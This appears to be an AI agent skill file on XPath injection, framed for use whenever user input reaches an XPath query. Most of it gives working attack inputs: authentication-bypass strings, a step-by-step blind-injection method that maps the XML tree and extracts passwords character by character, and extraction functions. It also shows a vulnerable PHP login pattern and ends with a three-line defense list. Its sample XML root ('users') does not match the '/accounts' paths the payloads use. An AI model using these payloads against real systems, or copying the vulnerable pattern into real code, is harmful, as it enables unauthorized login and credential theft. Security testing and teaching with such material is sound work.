---
name: xpath-injection
description: >-
  XPath injection. Use when user input is concatenated into an XPath query.
---

# XPath Injection


### Mechanism

XPath queries navigate XML documents. When user input enters XPath expressions:

```xml
<!-- XML data store: -->
<users>
  <user><name>admin</name><password>s3cret</password><role>admin</role></user>
  <user><name>guest</name><password>guest</password><role>user</role></user>
</users>
```

```
Original query:  //user[name='INPUT' and password='INPUT2']
Injection:       //user[name='admin' or '1'='1' and password='anything' or '1'='1']
```

### Authentication Bypass

```text
Username: admin' or '1'='1
Password: anything' or '1'='1
# Query: //user[name='admin' or '1'='1' and password='anything' or '1'='1']
# Always matches → returns first user (usually admin)
```

### Blind XPath Injection — Step-by-Step Methodology

When results are not directly visible, systematically map the XML structure then extract data:

```text
# Step 1: Confirm root structure
' or count(/)=1 and '1'='1              # always TRUE — 1 root document
' or count(/*)=1 and '1'='1             # check number of root element children

# Step 2: Discover root element name
' or string-length(name(//*[1]))=5 and '1'='1   # root element name is 5 chars?
' or substring(name(//*[1]),1,1)='u' and '1'='1  # first char is 'u'?

# Step 3: Count child nodes
' or count(/accounts)=1 and '1'='1      # confirm /accounts exists
' or count(/accounts/user)>0 and '1'='1 # has user children?
' or count(/accounts/user)=2 and '1'='1 # exactly 2 users

# Step 4: Discover child element names
' or string-length(name(/accounts/*[1]))=4 and '1'='1  # child name is 4 chars → "user"

# Step 5: Enumerate user attributes
' or count(/accounts/user[1]/*)>0 and '1'='1  # user has child elements?

# Step 6: Extract password length
' or string-length(//user[1]/password)=6 or '1'='2

# Step 7: Extract password character by character
' or substring(//user[1]/password,1,1)='s' or '1'='2  # 1st char
' or substring(//user[1]/password,2,1)='e' or '1'='2  # 2nd char
' or substring(//user[1]/password,3,1)='c' or '1'='2  # 3rd char
...
```

### Vulnerable Code Pattern (PHP)

```php
$x_query = "/accounts/user[username='{$username}' and password='{$password}']";
$result = $xml->xpath($x_query);
if ($result) { /* login success */ }
```

### Useful XPath Functions for Blind Extraction

```text
string-length(string)          → length of string
substring(string, pos, len)    → extract substring
count(node-set)                → count nodes
name(node)                     → element name
concat(str1, str2)             → concatenate
contains(str, substr)          → boolean contains check
starts-with(str, prefix)       → boolean prefix check
normalize-space(str)           → trim whitespace
```

### XPath 2.0 Extensions

```text
# If XPath 2.0 is available:
matches(string, regex)         → regex matching
lower-case(string)             → case conversion
tokenize(string, pattern)      → split string
```

### Defense

- Use parameterized XPath queries
- Input validation: reject `'`, `"`, `(`, `)`, `/`, `[`, `]`, `:`, `*`, `=`
- Consider using a proper database instead of XML data files for authentication

---
